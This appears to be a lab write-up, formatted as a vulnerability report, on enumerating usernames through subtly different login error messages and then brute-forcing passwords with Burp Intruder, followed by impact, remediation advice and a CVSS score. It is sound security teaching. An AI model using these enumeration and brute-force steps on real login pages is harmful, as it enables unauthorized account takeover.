# Title: Authentication: Username enumeration via subtly different responses

## Description

The application is vulnerable to username enumeration due to subtle differences in authentication responses. Although the login functionality attempts to return a generic error message for invalid credentials, the server generates slightly different responses depending on whether the supplied username exists.

An attacker can exploit these inconsistencies to identify valid usernames. Once a valid username is discovered, the attacker can perform targeted password brute-force attacks to gain unauthorized access to user accounts.

In this case, a minor variation in the error message enables enumeration of valid accounts and ultimately leads to successful authentication.

---

## Steps to Exploit

### 1. Identify the Login Endpoint

1. Navigate to the login page.
2. Submit invalid credentials.
3. Intercept the login request using Burp Suite.

Example request:

```http
POST /login HTTP/1.1

username=test
password=test
```

---

### 2. Enumerate Valid Usernames

1. Send the login request to Burp Intruder.
2. Highlight the `username` parameter as the payload position.

Example:

```http
username=§candidate-user§&password=invalid-password
```

3. Load the provided username wordlist.
4. Configure **Grep - Extract** to capture the login error message from responses.
5. Launch the attack.

---

### 3. Identify Response Differences

Most responses contain:

```text
Invalid username or password.
```

However, one response contains a subtly different message:

```text
Invalid username or password
```

or contains an extra trailing space.

This discrepancy indicates that the corresponding username exists within the application.

---

### 4. Perform Password Brute Force

Replace the identified username with the valid account:

```http
username=valid-user&password=§candidate-password§
```

1. Load the provided password wordlist.
2. Launch the Intruder attack.
3. Monitor response status codes.

---

### 5. Identify Valid Credentials

Most responses return:

```http
HTTP/1.1 200 OK
```

One request returns:

```http
HTTP/1.1 302 Found
```

The redirect indicates successful authentication.

Record the corresponding password.

---

### 6. Authenticate Successfully

1. Log in using the discovered username and password.
2. Access the account page.
3. Confirm successful authentication.

---

## Proof of Concept

### Username Enumeration Request

```http
POST /login

username=§candidate-user§
password=invalid-password
```

### Response Comparison

**Invalid User**

```text
Invalid username or password.
```

**Valid User**

```text
Invalid username or password
```

The subtle difference reveals that the username exists.

---

### Password Brute Force Request

```http
POST /login

username=valid-user
password=§candidate-password§
```

### Successful Response

```http
HTTP/1.1 302 Found
Location: /my-account
```

The redirect confirms successful authentication.

---

## Impact

* Enumeration of valid usernames.
* Increased effectiveness of password brute-force attacks.
* Unauthorized access to user accounts.
* Exposure of sensitive account information.
* Potential privilege escalation if administrative accounts are targeted.
* Reduced effectiveness of authentication security controls.

---

## Mitigation / Remediation

### 1. Return Consistent Error Messages

Ensure identical responses are returned regardless of whether the username exists.

Example:

```text
Invalid username or password.
```

The message should remain identical in content, formatting, and punctuation.

---

### 2. Normalize Response Behavior

Maintain consistent:

* Response body length
* HTTP status codes
* Response timing
* Error formatting

for all authentication failures.

---

### 3. Implement Rate Limiting

Restrict repeated login attempts from the same source.

Example:

```text
Maximum 5 failed login attempts within 15 minutes
```

---

### 4. Enable Account Lockout Controls

Temporarily lock accounts after excessive authentication failures.

---

### 5. Implement Multi-Factor Authentication

Require additional verification factors to reduce the impact of credential attacks.

---

### 6. Monitor Authentication Events

Detect and alert on:

* High-volume login attempts
* Username enumeration patterns
* Credential stuffing activity

---

## CVSS Score

**CVSS v3.1 Score:** 5.3 (Medium)

**Vector:**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                     |
| ------------------- | --------- | ------------------------------------------------- |
| Attack Vector       | Network   | Exploitable remotely through the login interface  |
| Attack Complexity   | Low       | Requires only observation of response differences |
| Privileges Required | None      | No authentication required                        |
| User Interaction    | None      | No victim interaction required                    |
| Scope               | Unchanged | Impact remains within the application             |
| Confidentiality     | Low       | Disclosure of valid usernames                     |
| Integrity           | None      | No direct modification of data                    |
| Availability        | None      | No direct service disruption                      |

---

## Conclusion

The application is vulnerable to username enumeration because authentication responses differ subtly when valid usernames are supplied. Attackers can leverage these discrepancies to identify legitimate accounts and subsequently perform targeted password brute-force attacks. Consistent authentication responses and proper rate-limiting controls are essential to prevent this class of vulnerability.
